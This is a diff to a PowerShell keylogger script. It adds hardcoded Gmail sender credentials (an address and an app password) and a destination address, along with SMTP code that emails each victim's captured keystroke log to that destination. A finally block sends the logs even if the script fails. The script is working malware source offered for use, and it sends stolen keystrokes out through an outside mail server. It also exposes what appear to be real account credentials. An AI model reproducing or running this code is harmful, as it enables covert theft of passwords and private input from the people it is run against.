@@ -1,9 +1,21 @@
 # powershell keylogger
+# created by : C0SM0
 
+# gmail credentials
+$email = "01100111.m3rc3h4ck@gmail.com"
+$password = "jjjcbfzmpbxyqaeo"
+$destino="gabrielg13rojas@gmail.com"
+
+# keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
   # email process
   $logs = Get-Content "$logFile"
+  $subject = "$env:UserName logs"
+  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
+  $smtp.EnableSSL = $true
+  $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
+  $smtp.Send($email, $destino, $subject, $logs);
 
   # generate log file
   $generateLog = New-Item -Path $logFile -ItemType File -Force
@@ -53,6 +65,12 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         }
       }
     }
+  }
+
+  # send logs if code fails
+  finally {
+    # send email
+    $smtp.Send($email, $email, $subject, $logs);
   }
 }
 
